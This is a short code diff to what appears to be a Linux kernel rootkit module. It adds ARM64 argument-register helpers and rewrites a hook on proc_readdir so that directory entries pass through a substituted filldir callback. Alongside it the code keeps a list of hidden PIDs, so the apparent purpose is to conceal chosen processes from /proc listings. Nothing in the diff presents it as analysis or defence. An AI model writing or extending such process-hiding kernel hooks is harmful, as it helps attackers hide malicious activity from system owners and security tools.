@@ -16,6 +16,15 @@
 
 #include "inline_hook/p_lkrg_main.h"
 
+#if defined(CONFIG_ARM64)
+static inline unsigned long p_inline_regs_get_arg2(hk_regs *p_regs) {
+   return p_regs->regs[1];
+}
+static inline void p_inline_regs_set_arg2(hk_regs *p_regs, unsigned long p_val) {
+   p_regs->regs[1]=p_val;
+}
+#endif
+
 // --- PID list management (unchanged) ---
 struct hidden_pid_entry {
     struct list_head list;
@@ -145,9 +154,13 @@ int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) {
         return 0;
     }
 
+    struct dir_context new_original_dc = {
+        .actor = hooked_filldir,
+        .pos = original_ctx->pos
+    };
+
+    hooked_ctx->original = new_original_dc;
     hooked_ctx->original_ctx = original_ctx;
-    hooked_ctx->original.actor = hooked_filldir;
-    hooked_ctx->original.pos = original_ctx->pos;
 
     p_inline_regs_set_arg2(regs, (unsigned long)&hooked_ctx->original);
 
